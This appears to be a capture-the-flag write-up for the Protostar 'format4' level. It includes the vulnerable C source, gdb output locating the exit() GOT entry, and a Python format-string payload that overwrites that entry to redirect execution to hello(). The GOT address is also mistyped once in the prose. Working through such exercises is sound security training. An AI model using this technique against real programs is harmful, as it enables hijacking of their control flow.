## FORMAT FOUR ##
format4 looks at one method of redirecting execution in a process.

Hints:

objdump -TR is your friend
This level is at /opt/protostar/bin/format4
### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

Now we need to find the offset
```
Starting program: /opt/protostar/bin/format4                                                                                                                                                                               
                                                                                                                                                                                                                           
Breakpoint 2, main (argc=1, argv=0xbffff874) at format4/format4.c:26                                                                                                                                                       
26      format4/format4.c: No such file or directory.                                                                                                                                                                      
        in format4/format4.c                                                                                                                                                                                               
(gdb) c                                                                                                                                                                                                                    
Continuing.                                                                                                                                                                                                                
AAAA                                                                                                                                                                                                                       
                                                                                                                                                                                                                           
Breakpoint 1, __printf (format=0xbffff5b0 "AAAA\n") at printf.c:30                                                                                                                                                         
30      printf.c: No such file or directory.                                              
        in printf.c                                                                       
(gdb) si                                                                                  
0xb7eddf91      30      in printf.c                                                       
(gdb) info frame                                                                          
Stack level 0, frame at 0xbffff5a0:                                                       
 eip = 0xb7eddf91 in __printf (printf.c:30); saved eip 0x8048508                          
 called by frame at 0xbffff7c0                                                            
 source language c.                                                                       
 Arglist at 0xbffff598, args: format=0xbffff5b0 "AAAA\n"                                  
 Locals at 0xbffff598, Previous frame's sp is 0xbffff5a0                                  
 Saved registers:                                                                         
  eip at 0xbffff59c                                                                       
(gdb) p 0xbffff5b0 - 0xbffff5a0                                                           
$1 = 16                         <- offset of 4 variables 
```
Then we need to find the adress of the *hello()* function and the address of
*exit()* in the GOT table. In this way, we can overwrite the *hello()* address
to the GOT entry which is supposed to be *exit()* function. After that,
*hello()* will be invoked when *exit()* is called.

```
(gdb) p hello
$2 = {void (void)} 0x80484b4 <hello>

$3 = {void (void)} 0x80484b4 <hello> 
(gdb) disassemble vuln
Dump of assembler code for function vuln:                                                                                                                                                                                  
0x080484d2 <vuln+0>:    push   %ebp
0x080484d3 <vuln+1>:    mov    %esp,%ebp
0x080484d5 <vuln+3>:    sub    $0x218,%esp
0x080484db <vuln+9>:    mov    0x8049730,%eax
0x080484e0 <vuln+14>:   mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:   movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:   lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:   mov    %eax,(%esp)
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:   mov    %eax,(%esp)
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   movl   $0x1,(%esp)
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>
End of assembler dump.                                                                                                                                                                                                     
(gdb) disassemble 0x80483ec
Dump of assembler code for function exit@plt:                                                                                                                                                                              
0x080483ec <exit@plt+0>:        jmp    *0x8049724
0x080483f2 <exit@plt+6>:        push   $0x30
0x080483f7 <exit@plt+11>:       jmp    0x804837c
End of assembler dump.                                                                                                                                                                                                     
(gdb) x/wx 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2  
```
That means we have to write 0x080484b4 into 0x80497224 (replacing 0x080483f2)

Now, we can exploit *printf* with %n in order to write to the required address
```python
import struct

print('\x24\x97\x04\x08' + '\x25\x97\x04\x08' + '\x26\x97\x04\x08' + 
      '\x27\x97\x04\x08' + '%4$164x%4$n' + '%5$208x%5$n' + '%6$128x%6$n' 
      + '%7$260x%7$n')
```
And the result
```
(python format4.py ; cat) | /opt/protostar/bin/format4
$%&'                                                                                                                                                             8049724                                                                                                                                                                                                         8049725                                                                                                                         8049726                                                                                                                                                                                                                                                             8049727
code execution redirected! you win
```
